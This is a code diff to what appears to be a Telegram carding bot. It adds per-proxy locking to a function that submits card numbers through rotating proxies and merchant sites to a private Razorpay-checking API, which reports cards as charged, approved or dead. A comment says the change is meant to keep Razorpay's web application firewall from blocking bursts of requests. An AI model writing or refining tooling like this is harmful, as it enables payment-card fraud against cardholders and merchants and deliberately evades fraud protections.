@@ -5,6 +5,7 @@ import random
 import os
 import json
 import itertools
+import threading
 import urllib.request
 import urllib.parse
 from datetime import datetime
@@ -93,6 +94,10 @@ def _next_site():
     return _sites[next(_site_ctr) % len(_sites)]
 
 
+_proxy_locks = {}
+_proxy_locks_guard = threading.Lock()
+
+
 def _next_proxy():
     global _proxies
     if not _proxies:
@@ -100,36 +105,64 @@ def _next_proxy():
     return _proxies[next(_proxy_ctr) % len(_proxies)]
 
 
+def _proxy_lock(proxy):
+    with _proxy_locks_guard:
+        if proxy not in _proxy_locks:
+            _proxy_locks[proxy] = threading.Lock()
+        return _proxy_locks[proxy]
+
+
+def _acquire_free_proxy():
+    """Pick a proxy that is NOT currently in-flight. 1 request per IP keeps
+    Razorpay's WAF from 403-ing on concurrent bursts from a single exit."""
+    global _proxies
+    n = len(_proxies)
+    if n == 0:
+        return None, None
+    for _ in range(n):
+        candidate = _proxies[next(_proxy_ctr) % n]
+        lock = _proxy_lock(candidate)
+        if lock.acquire(blocking=False):
+            return candidate, lock
+    candidate = _proxies[next(_proxy_ctr) % n]
+    lock = _proxy_lock(candidate)
+    lock.acquire()
+    return candidate, lock
+
+
 def check_fn(card):
     """Sync single-card check against the Razorpay API (VPS:9000). Returns (status, msg, brand)."""
     site = _next_site()
-    proxy = _next_proxy()
     if not site:
         return "ERROR", "No sites loaded (rz_site.txt empty)", "UNKNOWN"
-    if not proxy:
+    proxy, lock = _acquire_free_proxy()
+    if proxy is None:
         return "ERROR", "No proxies loaded", "UNKNOWN"
-    q = urllib.parse.urlencode({
-        "cc": card,
-        "site": site,
-        "proxy": proxy,
-        "amount": _amount_paise,
-        "region": REGION,
-    })
-    url = f"{RZ_API}/razorpay?{q}"
     try:
-        resp = urllib.request.urlopen(url, timeout=180)
-        data = json.loads(resp.read().decode())
-    except Exception as e:
-        return "ERROR", f"API: {str(e)[:80]}", "UNKNOWN"
-    status = str(data.get("status") or "error").lower()
-    msg = data.get("message") or data.get("reason") or "N/A"
-    if status == "charged":
-        return "CHARGED", msg, "CHARGED"
-    if status == "approved":
-        return "APPROVED", msg, "APPROVED"
-    if status == "dead":
-        return "DECLINED", msg, "UNKNOWN"
-    return "ERROR", msg, "UNKNOWN"
+        q = urllib.parse.urlencode({
+            "cc": card,
+            "site": site,
+            "proxy": proxy,
+            "amount": _amount_paise,
+            "region": REGION,
+        })
+        url = f"{RZ_API}/razorpay?{q}"
+        try:
+            resp = urllib.request.urlopen(url, timeout=180)
+            data = json.loads(resp.read().decode())
+        except Exception as e:
+            return "ERROR", f"API: {str(e)[:80]}", "UNKNOWN"
+        status = str(data.get("status") or "error").lower()
+        msg = data.get("message") or data.get("reason") or "N/A"
+        if status == "charged":
+            return "CHARGED", msg, "CHARGED"
+        if status == "approved":
+            return "APPROVED", msg, "APPROVED"
+        if status == "dead":
+            return "DECLINED", msg, "UNKNOWN"
+        return "ERROR", msg, "UNKNOWN"
+    finally:
+        lock.release()
 
 
 @router.message(F.text.startswith("/mrz") | F.caption.startswith("/mrz"))
